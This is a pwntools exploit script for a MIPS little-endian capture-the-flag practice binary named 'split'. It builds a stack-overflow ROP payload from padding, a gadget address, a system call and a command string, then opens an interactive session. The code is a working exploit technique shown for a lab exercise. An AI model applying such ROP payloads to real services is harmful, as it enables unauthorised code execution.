#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# Set up pwntools for the correct architecture
elf = context.binary = ELF('split_mipsel')

usefulString = elf.symbols["usefulString"]
usefulFunction = elf.symbols["usefulFunction"]

gs='''
b *pwnme+204
c
'''

g_lwa0t9 = 0x400a20

if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])


time.sleep(.5)


io.recvuntil(b"> ")

system = elf.got['system']

log.info(f"{usefulString=:x}")
system = usefulFunction+36

PL=0x24*b"A"+p32(g_lwa0t9)+p32(0)+p32(system)+p32(usefulString)
io.sendline(PL)
io.interactive()

